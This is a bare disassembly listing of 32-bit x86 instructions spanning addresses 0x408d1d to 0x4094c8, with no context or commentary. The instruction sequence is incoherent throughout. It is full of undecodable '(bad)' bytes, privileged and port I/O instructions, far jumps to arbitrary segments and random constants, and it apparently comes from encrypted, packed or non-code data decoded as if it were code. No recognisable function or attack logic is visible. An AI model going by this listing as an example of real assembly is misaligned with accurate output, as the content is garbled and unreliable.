  408d1d:	mov    DWORD PTR [eax],edi
  408d1f:	loopne 0x408d2e
  408d21:	sub    edx,DWORD PTR [edx]
  408d23:	lock push edi
  408d25:	sbb    eax,0x7a5ae1d5
  408d2a:	fwait
  408d2b:	std    
  408d2c:	pop    ds
  408d2d:	dec    ebx
  408d2e:	aas    
  408d2f:	aaa    
  408d30:	or     BYTE PTR [esi],0x9c
  408d33:	dec    ebp
  408d34:	xor    eax,0x2c8bf7ea
  408d39:	sti    
  408d3a:	(bad)  
  408d3b:	cmp    BYTE PTR [eax-0x211d114],bl
  408d41:	pusha  
  408d42:	or     ebx,DWORD PTR [edi]
  408d44:	mov    ds:0xc2868fbc,al
  408d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d4a:	out    0xe1,eax
  408d4c:	xor    eax,0xadffc24a
  408d51:	jecxz  0x408dc6
  408d53:	lods   al,BYTE PTR ds:[esi]
  408d54:	xchg   ecx,eax
  408d55:	mov    bl,BYTE PTR [edx]
  408d57:	sbb    DWORD PTR [ebx-0x71a89f26],0x15
  408d5e:	inc    edx
  408d5f:	dec    eax
  408d60:	jmp    0xd521:0xba322ec4
  408d67:	jp     0x408dc3
  408d69:	push   ss
  408d6a:	sbb    al,0x92
  408d6c:	mov    al,ah
  408d6e:	sbb    DWORD PTR [ebx+ecx*8+0x62df6878],edx
  408d75:	or     al,0xbe
  408d77:	and    al,0x75
  408d79:	add    eax,0x8994ee9c
  408d7e:	xor    BYTE PTR [ecx],dh
  408d80:	dec    DWORD PTR [edx-0x3c19d3d3]
  408d86:	jae    0x408ddf
  408d88:	mov    al,ds:0xa29ee70
  408d8d:	pusha  
  408d8e:	loopne 0x408d88
  408d90:	test   al,0x1a
  408d92:	fst    DWORD PTR [ecx-0x37cf190e]
  408d98:	add    BYTE PTR [edx],ch
  408d9a:	xor    ebx,DWORD PTR [edi+0x76620da1]
  408da0:	xor    dl,bh
  408da2:	mov    ds:0x211b2839,eax
  408da7:	xchg   ebx,eax
  408da8:	xchg   esi,eax
  408da9:	inc    esi
  408daa:	xor    bl,ch
  408dac:	push   ds
  408dad:	jno    0x408de1
  408daf:	xor    dh,dh
  408db1:	test   al,0xb0
  408db3:	sbb    edi,DWORD PTR [ebx-0x59]
  408db6:	in     eax,0x7c
  408db8:	(bad)  
  408db9:	in     eax,dx
  408dba:	inc    ecx
  408dbb:	push   edx
  408dbc:	aas    
  408dbd:	addr16 adc al,0x7b
  408dc0:	cs fs mov dh,0x2d
  408dc4:	out    dx,eax
  408dc5:	(bad)  
  408dc8:	imul   BYTE PTR [eax]
  408dca:	push   edx
  408dcb:	icebp  
  408dcc:	not    BYTE PTR [edi+edx*1-0x7c]
  408dd0:	js     0x408dff
  408dd2:	cmp    DWORD PTR [esi+eiz*2+0x7d1d21b3],eax
  408dd9:	mov    edx,DWORD PTR [esi]
  408ddb:	sbb    DWORD PTR [ebp+0x1f41411],0xb
  408de2:	xor    DWORD PTR [eax+0x73b3a8e8],ebp
  408de8:	add    edx,DWORD PTR [edx-0x5f]
  408deb:	inc    eax
  408dec:	aas    
  408ded:	(bad)  
  408dee:	mov    esp,0xe2089f9b
  408df3:	stos   DWORD PTR es:[edi],eax
  408df4:	out    0x87,eax
  408df6:	lock cmp eax,0x727fcb14
  408dfc:	mov    dh,0xc3
  408dfe:	shl    DWORD PTR ds:0x6d857f1f,1
  408e04:	scas   eax,DWORD PTR es:[edi]
  408e05:	int3   
  408e06:	hlt    
  408e07:	ins    BYTE PTR es:[edi],dx
  408e08:	jbe    0x408deb
  408e0a:	mov    DWORD PTR [ebx+ebx*1-0x34],edi
  408e0e:	inc    esi
  408e0f:	dec    edx
  408e10:	sbb    al,0xa5
  408e12:	retf   0x7ae0
  408e15:	jmp    0x408dbf
  408e17:	inc    ebp
  408e18:	and    bh,0xcf
  408e1b:	and    al,0xd1
  408e1d:	test   eax,0xbffb99d9
  408e22:	lds    edi,FWORD PTR [edx+0x32]
  408e25:	cs inc ebp
  408e27:	int3   
  408e28:	sub    eax,0x69aa1fcc
  408e2d:	mov    al,0x26
  408e2f:	cmpps  xmm0,xmm0,0xe7
  408e33:	push   esp
  408e34:	les    eax,FWORD PTR [edi-0x15]
  408e37:	cld    
  408e38:	test   cl,ah
  408e3a:	sub    eax,0xa20484d0
  408e3f:	push   edi
  408e40:	xchg   ebx,eax
  408e41:	imul   esp,DWORD PTR [edx],0xffffff91
  408e44:	mov    dl,0x17
  408e46:	retf   0x179a
  408e49:	push   edi
  408e4a:	stc    
  408e4b:	dec    esi
  408e4c:	iret   
  408e4d:	pop    es
  408e4e:	sti    
  408e4f:	cmp    eax,0xd14ae2fb
  408e54:	add    eax,0xb6d5125a
  408e59:	xor    BYTE PTR [ebx-0x36],bh
  408e5c:	test   eax,0x219d6d4
  408e61:	popa   
  408e62:	and    ecx,ebx
  408e64:	fsub   DWORD PTR [esi+0x120ab1c7]
  408e6a:	test   DWORD PTR [ebx+0x2d],ebp
  408e6d:	mov    ebp,0x78d219b5
  408e72:	dec    edi
  408e73:	fisttp QWORD PTR [edx-0x99ecb60]
  408e79:	lds    edi,FWORD PTR [eax]
  408e7b:	xor    eax,0x179391d
  408e80:	sbb    edx,0x4388db7d
  408e86:	mov    eax,ds:0xbde64e9b
  408e8b:	ins    BYTE PTR es:[edi],dx
  408e8c:	aaa    
  408e8d:	repnz inc esi
  408e8f:	dec    ecx
  408e90:	(bad)  [ecx]
  408e92:	pusha  
  408e93:	or     DWORD PTR [ebp+0x70],0x4
  408e97:	jg     0x408e1f
  408e99:	mov    bh,0x9f
  408e9b:	scas   al,BYTE PTR es:[edi]
  408e9c:	fisttp QWORD PTR [eax+edi*2+0x73]
  408ea0:	into   
  408ea1:	adc    DWORD PTR [ecx-0x34803cc8],0xf5640d28
  408eab:	inc    eax
  408eac:	pushf  
  408ead:	jno    0x408e8b
  408eaf:	dec    esp
  408eb0:	cmp    dl,BYTE PTR [esi]
  408eb2:	cmp    DWORD PTR [ecx+edi*8],ebx
  408eb5:	mov    edi,0xda59c63e
  408eba:	outs   dx,BYTE PTR ds:[esi]
  408ebb:	pop    ecx
  408ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ebd:	scas   eax,DWORD PTR es:[edi]
  408ebe:	rep lods eax,DWORD PTR ds:[esi]
  408ec0:	arpl   WORD PTR [ecx+ebp*1],cx
  408ec3:	mov    edx,DWORD PTR [edi+0x22]
  408ec6:	test   DWORD PTR [ebx+0x75],esi
  408ec9:	bnd jns 0x408e4e
  408ecc:	rol    BYTE PTR [ebx+0x7e],cl
  408ecf:	lock mov esp,0x867f8a97
  408ed5:	push   ds
  408ed6:	xchg   esp,eax
  408ed7:	push   esi
  408ed8:	xchg   esp,eax
  408ed9:	cli    
  408eda:	std    
  408edb:	xor    al,0x85
  408edd:	fs or  eax,0x89b21c9a
  408ee3:	mov    WORD PTR [ebp-0x17],?
  408ee6:	repz hlt 
  408ee8:	(bad)  
  408ee9:	adc    DWORD PTR [ecx+0x24],esp
  408eec:	inc    esp
  408eed:	outs   dx,DWORD PTR ds:[esi]
  408eee:	cmp    al,0x3c
  408ef0:	sub    ebx,eax
  408ef2:	into   
  408ef3:	popf   
  408ef4:	lds    ebx,FWORD PTR [esp+esi*4+0x6]
  408ef8:	add    cl,BYTE PTR [edx]
  408efa:	call   0xbf8e:0xdcb31a1c
  408f01:	cmp    DWORD PTR ds:0xee5b18c1,esi
  408f07:	cs pop edi
  408f09:	and    BYTE PTR [esi],0xc6
  408f0c:	add    al,0x3
  408f0e:	or     cl,BYTE PTR [esi]
  408f10:	dec    esi
  408f11:	cmc    
  408f12:	push   es
  408f13:	pop    eax
  408f14:	or     al,0x5f
  408f16:	xlat   BYTE PTR ds:[ebx]
  408f17:	popf   
  408f18:	xchg   BYTE PTR [ebx-0x4ae80755],cl
  408f1e:	loopne 0x408f7b
  408f20:	ss pop edi
  408f22:	xchg   edx,eax
  408f23:	dec    ebp
  408f24:	sbb    al,0x70
  408f26:	in     eax,dx
  408f27:	sub    eax,0xd5da7706
  408f2c:	push   gs
  408f2e:	cmp    eax,0x34c734fe
  408f33:	add    cl,BYTE PTR [ecx]
  408f35:	jns    0x408f05
  408f37:	rol    ecx,0x8e
  408f3a:	ins    DWORD PTR es:[edi],dx
  408f3b:	nop
  408f3c:	mov    bh,0x8b
  408f3e:	mov    ecx,0x7565ad12
  408f43:	xchg   edi,eax
  408f44:	mov    esi,0x71e90e51
  408f49:	inc    edx
  408f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f4b:	pop    esi
  408f4c:	cmc    
  408f4d:	(bad)  
  408f4e:	sar    ebx,cl
  408f50:	mov    eax,0x5192e7ec
  408f55:	js     0x408f1b
  408f57:	and    ch,BYTE PTR [esp+0x23]
  408f5b:	mov    dh,0x2b
  408f5d:	frstor [ebp-0x513a2228]
  408f63:	mov    es,WORD PTR [esi+eax*4-0x61]
  408f67:	fstp   QWORD PTR [ebp+0x66]
  408f6a:	enter  0x78ed,0xcc
  408f6e:	int3   
  408f6f:	jl     0x408fe3
  408f71:	pop    eax
  408f72:	xlat   BYTE PTR ds:[ebx]
  408f73:	cmp    DWORD PTR [esi],eax
  408f75:	cs inc eax
  408f77:	mov    dh,0xda
  408f79:	dec    edi
  408f7a:	mov    WORD PTR [ebp+0x35],es
  408f7d:	sub    esi,DWORD PTR [ebx-0xe5c4ef2]
  408f83:	mov    bl,0x8e
  408f85:	ja     0x408ff3
  408f87:	jl     0x408fb6
  408f89:	jmp    0x6d4712c2
  408f8e:	clc    
  408f8f:	fwait
  408f90:	ins    DWORD PTR es:[edi],dx
  408f91:	cld    
  408f92:	jmp    DWORD PTR [edi-0x4d]
  408f95:	inc    ebx
  408f96:	add    bh,BYTE PTR [edx]
  408f98:	sbb    BYTE PTR [edx+0x41356a8],ah
  408f9e:	aaa    
  408f9f:	lds    esi,FWORD PTR [edx+0xf]
  408fa2:	(bad)  
  408fa3:	and    edi,DWORD PTR cs:[esi]
  408fa6:	enter  0x2ab4,0x2b
  408faa:	xor    eax,0xc00ae8bf
  408faf:	loope  0x408f4c
  408fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fb2:	add    DWORD PTR [esi],eax
  408fb4:	adc    ebx,ebp
  408fb6:	push   edx
  408fb7:	adc    BYTE PTR [ebp+0x51de281c],cl
  408fbd:	inc    esp
  408fbe:	pop    edx
  408fbf:	test   al,0xae
  408fc1:	ja     0x408f88
  408fc3:	or     al,0xe0
  408fc5:	nop
  408fc6:	or     BYTE PTR [ecx],bl
  408fc8:	sbb    al,0xc3
  408fca:	xor    ebp,edi
  408fcc:	cmp    eax,0x863a2d76
  408fd1:	repz push edx
  408fd3:	sbb    esi,DWORD PTR [edi+0x6c]
  408fd6:	push   eax
  408fd7:	dec    BYTE PTR ds:0x5c6252ee
  408fdd:	adc    dh,dl
  408fdf:	jl     0x408ff2
  408fe1:	inc    esi
  408fe2:	daa    
  408fe3:	ficomp WORD PTR [edx+0x7b]
  408fe6:	inc    ebp
  408fe7:	adc    al,0x1
  408fe9:	adc    al,0xbd
  408feb:	test   al,0x7f
  408fed:	push   0x64ea6847
  408ff2:	out    dx,al
  408ff3:	push   edi
  408ff4:	test   DWORD PTR [esi],ebx
  408ff6:	ins    BYTE PTR es:[edi],dx
  408ff7:	stc    
  408ff8:	shr    dh,0x22
  408ffb:	pop    eax
  408ffc:	inc    ebp
  408ffd:	aad    0xc1
  408fff:	adc    bx,bp
  409002:	jmp    0x40906f
  409004:	clc    
  409005:	repz (bad) 
  409007:	gs jne 0x409006
  40900a:	retf   0x4ad2
  40900d:	push   cs
  40900e:	sub    DWORD PTR [ecx+ebp*1-0x4b],0xee35494d
  409016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409017:	iret   
  409018:	arpl   dx,bp
  40901a:	fdivr  QWORD PTR es:[edx-0x7617dd32]
  409021:	jmp    0x4ef9:0x5e62d0ff
  409028:	mov    ecx,0x58763ece
  40902d:	js     0x4090ae
  40902f:	pusha  
  409030:	pop    esp
  409031:	jp     0x408fc9
  409033:	xor    esp,DWORD PTR [eax+0x6e]
  409036:	pop    esi
  409037:	adc    dl,BYTE PTR [ebp+0x7040cec4]
  40903d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40903e:	je     0x408fc0
  409040:	jno    0x40903f
  409042:	div    BYTE PTR [eax-0x3d]
  409045:	cwde   
  409046:	pushf  
  409047:	cmp    bl,BYTE PTR [eax]
  409049:	xor    al,0x85
  40904b:	push   edi
  40904c:	je     0x4090cb
  40904e:	test   eax,0x10f1c3de
  409053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409054:	in     al,0x5
  409056:	test   eax,0xcb04cda7
  40905b:	sbb    edx,DWORD PTR [esi-0x65bfaa77]
  409061:	shl    bl,cl
  409063:	daa    
  409064:	sub    esi,esp
  409066:	adc    edx,DWORD PTR [eax-0x39]
  409069:	dec    ecx
  40906a:	jmp    0x4f61484
  40906f:	outs   dx,BYTE PTR ds:[esi]
  409070:	scas   al,BYTE PTR es:[edi]
  409071:	mul    BYTE PTR [ebp+0x67]
  409074:	(bad)  
  409075:	cmp    ecx,esp
  409077:	ins    BYTE PTR es:[edi],dx
  409078:	ret    
  409079:	pop    ecx
  40907a:	retf   0x7949
  40907d:	mov    dh,al
  40907f:	addr16 ret 
  409081:	or     dl,ch
  409083:	std    
  409084:	inc    ecx
  409085:	jl     0x40908d
  409087:	sub    al,0x56
  409089:	cmp    al,0x6b
  40908b:	rol    BYTE PTR [edi],1
  40908d:	jg     0x40904c
  40908f:	pop    ebp
  409090:	xor    esi,ecx
  409092:	loope  0x4090c8
  409094:	into   
  409095:	inc    edx
  409096:	pop    ss
  409097:	jnp    0x409094
  409099:	inc    esi
  40909a:	adc    eax,0xfe23b4b1
  40909f:	mov    al,ds:0xdbdeb657
  4090a4:	retf   
  4090a5:	push   esi
  4090a6:	ficomp WORD PTR [eiz*4+0x4f4126e1]
  4090ad:	aaa    
  4090ae:	pop    es
  4090af:	out    dx,eax
  4090b0:	pushf  
  4090b1:	enter  0x1f66,0xbb
  4090b5:	icebp  
  4090b6:	jmp    0x409128
  4090b8:	std    
  4090b9:	mov    dh,0x49
  4090bb:	sbb    BYTE PTR [edx+edx*2-0x2b64b779],ch
  4090c2:	xor    eax,0x2496099b
  4090c7:	dec    esi
  4090c8:	cli    
  4090c9:	mov    BYTE PTR [ebp+0x1b],dh
  4090cc:	or     bh,BYTE PTR [eax+0x6a]
  4090cf:	adc    al,0x3e
  4090d1:	dec    esi
  4090d2:	inc    edx
  4090d3:	loope  0x409062
  4090d5:	ins    BYTE PTR es:[edi],dx
  4090d6:	mov    BYTE PTR ds:0x604bce8a,dl
  4090dc:	loop   0x40910e
  4090de:	test   BYTE PTR [esi],dl
  4090e0:	int    0xac
  4090e2:	sub    esi,DWORD PTR [ecx]
  4090e4:	mov    edi,0x3ae5556a
  4090e9:	push   ss
  4090ea:	bound  esi,QWORD PTR [edi-0x63]
  4090ed:	daa    
  4090ee:	mov    gs,ecx
  4090f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090f1:	es addr16 jmp 0x40914d
  4090f5:	stos   DWORD PTR es:[edi],eax
  4090f6:	jne    0x4090be
  4090f8:	cdq    
  4090f9:	jns    0x409130
  4090fb:	mov    ch,0xa6
  4090fd:	add    eax,0x30b777b5
  409102:	fidiv  WORD PTR [ecx-0x1f]
  409105:	lahf   
  409106:	lds    esp,FWORD PTR ds:[edi]
  409109:	mov    ah,0xe4
  40910b:	mov    DWORD PTR [ecx+0x483c7c7b],0x62ad5f7b
  409115:	mov    cl,0x3
  409117:	outs   dx,DWORD PTR ds:[esi]
  409118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40911a:	jbe    0x40915d
  40911c:	cmp    al,0x33
  40911e:	sub    al,0xaa
  409120:	dec    BYTE PTR [edx+0x7d6a50ae]
  409126:	arpl   WORD PTR [edx],di
  409128:	sbb    dh,ch
  40912a:	pop    ds
  40912b:	out    0xd6,al
  40912d:	xor    edi,DWORD PTR [esi+0x26ecbbd7]
  409133:	iret   
  409134:	into   
  409135:	mov    cl,BYTE PTR [edi]
  409137:	lock push edi
  409139:	xchg   ebp,eax
  40913a:	push   eax
  40913b:	jle    0x2c77373a
  409141:	mov    ah,0xfc
  409143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409144:	mov    eax,0x46a27cf2
  409149:	inc    edx
  40914a:	inc    eax
  40914b:	retf   0xaf17
  40914e:	fstp   QWORD PTR [ebx-0x5474c63a]
  409154:	sbb    eax,DWORD PTR [edx+0x493d673]
  40915a:	sbb    al,0x4b
  40915c:	retf   
  40915d:	in     eax,0x54
  40915f:	popf   
  409160:	aas    
  409161:	dec    ebx
  409162:	push   es
  409163:	clc    
  409164:	mov    BYTE PTR [eax-0x15],bl
  409167:	adc    al,0xf1
  409169:	sbb    BYTE PTR [ecx],ch
  40916b:	sub    BYTE PTR [ebp-0x1128b04b],dl
  409171:	xor    BYTE PTR [edx],0x92
  409174:	loope  0x409196
  409176:	jmp    0xd0fb:0x1a5af843
  40917d:	xor    DWORD PTR [ecx+ebp*4+0x64495c87],ebx
  409184:	cmp    al,BYTE PTR [ebp+0x66]
  409187:	add    eax,0xf225afc7
  40918c:	addr16 je 0x40910f
  40918f:	xchg   ecx,eax
  409190:	adc    ecx,DWORD PTR [esi-0x13]
  409193:	jb     0x40912a
  409195:	fwait
  409196:	push   es
  409197:	mov    al,0xf3
  409199:	pop    eax
  40919a:	mov    bl,0x33
  40919c:	out    0x6b,eax
  40919e:	push   ebp
  40919f:	xchg   edx,eax
  4091a0:	pop    edx
  4091a1:	xor    ebx,ecx
  4091a3:	mov    esi,0xfc85ed4
  4091a8:	leave  
  4091a9:	arpl   WORD PTR [edi-0x9],ax
  4091ac:	xor    edx,DWORD PTR [edi]
  4091ae:	cmp    ah,ah
  4091b0:	cld    
  4091b1:	call   0xc2a15cf1
  4091b6:	lds    ecx,FWORD PTR ds:0xb8b60e42
  4091bc:	jnp    0x40916f
  4091be:	mov    ah,0x53
  4091c0:	mov    edx,0x50f79c48
  4091c5:	jb     0x409227
  4091c7:	or     ch,bh
  4091c9:	sub    edx,0x2602f5d4
  4091cf:	addr16 jp 0x409177
  4091d2:	fdivrp st(3),st
  4091d4:	lods   al,BYTE PTR ds:[esi]
  4091d5:	out    dx,al
  4091d6:	test   DWORD PTR [esi-0x1659bd07],edx
  4091dc:	mov    dl,0x30
  4091de:	lahf   
  4091df:	imul   esp,ecx,0x7d641284
  4091e5:	in     eax,0x2b
  4091e7:	imul   ebp,DWORD PTR [edx],0xfffffff9
  4091ea:	dec    ecx
  4091eb:	pop    ecx
  4091ec:	pop    esp
  4091ed:	push   0x10
  4091ef:	dec    esp
  4091f0:	dec    esp
  4091f1:	xchg   DWORD PTR ds:0xbcc6f8cd,ebx
  4091f7:	(bad)  
  4091f8:	adc    eax,0xeef2737b
  4091fd:	and    esp,DWORD PTR [edx+edi*4+0x367204b8]
  409204:	xlat   BYTE PTR ds:[ebx]
  409205:	mov    DWORD PTR [edx-0x49],eax
  409208:	jp     0x4091e6
  40920a:	sub    edi,esi
  40920c:	loop   0x4091ac
  40920e:	call   0x9c49:0x6cbd0add
  409215:	lods   eax,DWORD PTR ds:[esi]
  409216:	cvtpi2ps xmm2,QWORD PTR [ecx+0x4516d47a]
  40921d:	enter  0xa74e,0x1d
  409221:	xchg   esp,eax
  409222:	imul   ebx,DWORD PTR [eax],0xa482d0e
  409228:	aad    0x1f
  40922a:	jl     0x409206
  40922c:	inc    ecx
  40922d:	inc    ecx
  40922e:	rol    DWORD PTR [edi-0x46],0x62
  409232:	mov    bl,0xed
  409234:	test   BYTE PTR [ecx+edx*1-0x2910e498],al
  40923b:	ja     0x40926a
  40923d:	xor    DWORD PTR [ecx],edx
  40923f:	pop    edx
  409240:	(bad)  
  409241:	gs out dx,al
  409243:	outs   dx,BYTE PTR ds:[esi]
  409244:	adc    BYTE PTR [edi-0x30],cl
  409247:	out    dx,eax
  409248:	daa    
  409249:	shl    BYTE PTR [esi],cl
  40924b:	or     eax,0x188e659f
  409250:	icebp  
  409251:	mov    ch,0x8b
  409253:	mov    WORD PTR [edx-0x7d0490],gs
  409259:	arpl   WORD PTR [ebx+0x23e08a38],si
  40925f:	adc    dh,bl
  409261:	xor    eax,DWORD PTR [esi+0x64]
  409264:	xchg   edx,eax
  409265:	jle    0x409279
  409267:	or     eax,0x968e90a6
  40926c:	push   cs
  40926d:	or     ebx,DWORD PTR [ecx+0x38]
  409270:	mov    al,0x8
  409272:	jae    0x409266
  409274:	inc    ebx
  409275:	sbb    ebp,DWORD PTR [esi+0x56]
  409278:	xchg   esp,eax
  409279:	sbb    BYTE PTR [edx-0x26],cl
  40927c:	(bad)  
  40927d:	(bad)  
  40927e:	or     DWORD PTR [ebx-0x55829a4f],0x4e
  409285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409286:	push   cs
  409287:	dec    ebx
  409288:	scas   eax,DWORD PTR es:[edi]
  409289:	push   ebp
  40928a:	out    0x6d,al
  40928c:	jecxz  0x409212
  40928e:	push   ecx
  40928f:	push   edx
  409290:	xor    al,0x36
  409292:	(bad)  
  409293:	std    
  409294:	inc    ebp
  409295:	mov    ecx,0x8e72025d
  40929a:	adc    eax,0xc1b421b9
  40929f:	(bad)  
  4092a1:	push   ebp
  4092a2:	sub    cl,ah
  4092a4:	loope  0x409260
  4092a6:	mov    ah,0xac
  4092a8:	and    ch,BYTE PTR ds:0x7c3c6dcf
  4092ae:	(bad)  
  4092af:	clc    
  4092b0:	pop    ebx
  4092b1:	(bad)  
  4092b2:	or     edi,esi
  4092b4:	pop    ebx
  4092b5:	arpl   WORD PTR ds:0x87a66fbd,bp
  4092bb:	int3   
  4092bc:	adc    BYTE PTR es:[ebx+0x50f9afaa],dl
  4092c3:	mov    eax,0xf8791be7
  4092c8:	xor    edx,DWORD PTR [edi]
  4092ca:	test   al,ah
  4092cc:	mov    esi,0x9b2fc7fa
  4092d1:	xchg   DWORD PTR [ebx],esp
  4092d3:	xchg   esp,eax
  4092d4:	adc    BYTE PTR [ebx-0x4e],ch
  4092d7:	add    esi,DWORD PTR [ecx+eiz*4]
  4092da:	dec    DWORD PTR [esp+ebp*1]
  4092dd:	pop    ss
  4092de:	aaa    
  4092df:	stc    
  4092e0:	mov    eax,ds:0x283680c4
  4092e5:	shl    ah,1
  4092e7:	add    bh,bl
  4092e9:	sub    bh,BYTE PTR [eax-0x21]
  4092ec:	les    ebx,FWORD PTR [esi+ebp*4-0x5c0a718f]
  4092f3:	xchg   ebp,eax
  4092f4:	movq   mm6,QWORD PTR [esi-0x49]
  4092f8:	sub    eax,0xe43e36e5
  4092fd:	pop    eax
  4092fe:	sar    BYTE PTR [edi-0x31],cl
  409301:	sub    eax,0x55580890
  409306:	lea    ebp,[esi]
  409308:	dec    edx
  409309:	rcr    bl,1
  40930b:	sub    BYTE PTR [esi],ah
  40930d:	repnz inc edi
  40930f:	push   ecx
  409310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409311:	jmp    0x40931c
  409313:	jle    0x4092b9
  409315:	mov    ds:0xf93729f6,eax
  40931a:	in     al,0xc9
  40931c:	idiv   DWORD PTR [ebp+0x34b35907]
  409322:	sar    al,cl
  409324:	pop    esp
  409325:	stos   DWORD PTR es:[edi],eax
  409326:	dec    edx
  409327:	pop    es
  409328:	xor    DWORD PTR [ecx+0x662dfc5a],esi
  40932e:	das    
  40932f:	push   esp
  409330:	mov    ds:0xb0070fbd,al
  409335:	mov    cl,0x2
  409337:	call   0xd1ad:0x60123a7b
  40933e:	rol    DWORD PTR [edx-0x5c],1
  409341:	jo     0x4092cd
  409343:	adc    eax,0x97ff5457
  409348:	pusha  
  409349:	cmp    al,0xf0
  40934b:	std    
  40934c:	ds pop esp
  40934e:	iret   
  40934f:	and    bl,0x42
  409352:	mov    bh,0x71
  409354:	cmp    BYTE PTR [ecx-0xc],ch
  409357:	pop    es
  409358:	test   al,0x29
  40935a:	add    bl,0xd8
  40935d:	int    0x29
  40935f:	fiadd  WORD PTR [edx+ecx*8-0x53]
  409363:	push   edx
  409364:	adc    eax,0x800de4f5
  409369:	iret   
  40936a:	ror    dh,1
  40936c:	ja     0x4093cb
  40936e:	aaa    
  40936f:	pop    ss
  409370:	and    al,0xc4
  409372:	mov    al,ds:0x67df920e
  409377:	mov    ecx,0x20dd5bbe
  40937c:	mov    ecx,0xe0448457
  409381:	repz lahf 
  409383:	xchg   esi,eax
  409384:	pop    esi
  409385:	mov    al,0x53
  409387:	add    eax,DWORD PTR [ebp-0x18e82215]
  40938d:	inc    eax
  40938e:	pop    ss
  40938f:	cmp    al,0x56
  409391:	xchg   esp,eax
  409392:	inc    ecx
  409393:	adc    al,0x35
  409395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409396:	mov    ecx,0x107854c2
  40939b:	jbe    0x409336
  40939d:	sbb    DWORD PTR [ecx-0x20fc7b0f],0x734abdf5
  4093a7:	mov    ch,BYTE PTR [edx+0x54]
  4093aa:	lea    edi,[esi+0x72]
  4093ad:	mov    eax,ds:0x908580a6
  4093b2:	aas    
  4093b3:	cmp    bh,ch
  4093b5:	push   0x4f0b7eff
  4093ba:	test   BYTE PTR [edi+0x7f8115b6],0x27
  4093c1:	mov    ebp,0x9d7264c5
  4093c6:	sbb    al,0x3e
  4093c8:	(bad)  
  4093c9:	test   eax,0xd886db7d
  4093ce:	nop
  4093cf:	or     eax,0x1facf958
  4093d4:	push   eax
  4093d5:	mov    ds:0xcca4c744,eax
  4093da:	inc    edi
  4093db:	jmp    0x145a47c8
  4093e0:	mov    ebp,0x77d36e38
  4093e5:	fldcw  WORD PTR [ebp+0x4f]
  4093e8:	push   ecx
  4093e9:	icebp  
  4093ea:	xchg   ecx,eax
  4093eb:	add    dh,al
  4093ed:	xchg   ebx,ebx
  4093ef:	inc    ebp
  4093f0:	and    DWORD PTR [edi-0x38],ebx
  4093f3:	ret    0x3a63
  4093f6:	jp     0x40943d
  4093f8:	imul   edi,DWORD PTR [ecx-0x5abba816],0xffffffdf
  4093ff:	xor    edx,0xa4ee7c8e
  409405:	xor    al,0x73
  409407:	mov    edi,DWORD PTR [ecx]
  409409:	rcl    al,cl
  40940b:	push   edx
  40940c:	lods   al,BYTE PTR ds:[esi]
  40940d:	cli    
  40940e:	lea    ebp,[eax]
  409410:	shl    cl,0xc0
  409413:	add    esp,DWORD PTR [ebp-0x32]
  409416:	jmp    DWORD PTR [eax-0x73]
  409419:	or     al,0x60
  40941b:	push   edx
  40941c:	pop    eax
  40941d:	mov    esi,0x76b752cd
  409422:	neg    BYTE PTR [ebx]
  409424:	popf   
  409425:	xchg   edx,eax
  409426:	mul    esp
  409428:	mov    ah,0xae
  40942a:	stc    
  40942b:	sbb    BYTE PTR [edx+0x5d],ah
  40942e:	stc    
  40942f:	retf   
  409430:	int    0x2c
  409432:	sbb    DWORD PTR [ebx],ecx
  409434:	pushf  
  409435:	fidivr WORD PTR [ecx+esi*8]
  409438:	inc    edx
  409439:	pop    ebx
  40943a:	xor    ecx,DWORD PTR [esi+0x434c95e4]
  409440:	xchg   DWORD PTR [ebx+0x10],ebp
  409443:	fistp  DWORD PTR [edx]
  409445:	xchg   DWORD PTR [ecx-0x60],eax
  409448:	scas   eax,DWORD PTR es:[edi]
  409449:	xchg   ecx,eax
  40944a:	push   ebx
  40944b:	bound  ebx,QWORD PTR [ebp+eiz*1-0xc87d0d4]
  409452:	cs icebp 
  409454:	lahf   
  409455:	mov    dl,dh
  409457:	repz mov dh,0xdc
  40945a:	mov    dh,0xb2
  40945c:	mov    bh,0xf
  40945e:	dec    edx
  40945f:	mov    al,ds:0xf8977741
  409464:	into   
  409465:	inc    esp
  409466:	adc    eax,0xba523d33
  40946b:	mov    DWORD PTR [ebp+0x5bd5eb08],ecx
  409471:	push   es
  409472:	mov    BYTE PTR [ebx],ch
  409474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409475:	popf   
  409476:	mov    edi,0x8cf503ed
  40947b:	jnp    0x4094f5
  40947d:	aad    0xa9
  40947f:	aam    0x13
  409481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409482:	repz and ecx,ebp
  409485:	in     eax,0x30
  409487:	xchg   edi,eax
  409488:	sub    ebx,DWORD PTR ds:0xccd10b42
  40948e:	dec    ebx
  40948f:	mov    eax,0x89ea20ed
  409494:	shl    BYTE PTR [ebx+0x7e],1
  409497:	cmp    DWORD PTR [ecx+0x73],ebp
  40949a:	lock mov ds:0x977e4163,al
  4094a0:	adc    BYTE PTR [ebx],dh
  4094a2:	retf   
  4094a3:	pop    es
  4094a4:	fimul  DWORD PTR [eax]
  4094a6:	lea    esp,[edx+0x55]
  4094a9:	in     al,dx
  4094aa:	dec    ebp
  4094ab:	sti    
  4094ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094ad:	ds cmp cl,dh
  4094b0:	outs   dx,BYTE PTR ds:[esi]
  4094b1:	jge    0x4094a1
  4094b3:	in     eax,dx
  4094b4:	jo     0x409521
  4094b6:	repnz mov bh,0x87
  4094b9:	das    
  4094ba:	ins    DWORD PTR es:[edi],dx
  4094bb:	dec    ebx
  4094bc:	imul   esp,ebx,0xffffff92
  4094bf:	mov    eax,0x9a44bc87
  4094c4:	pop    ecx
  4094c5:	or     bl,ah
  4094c7:	std    
  4094c8:	hlt    
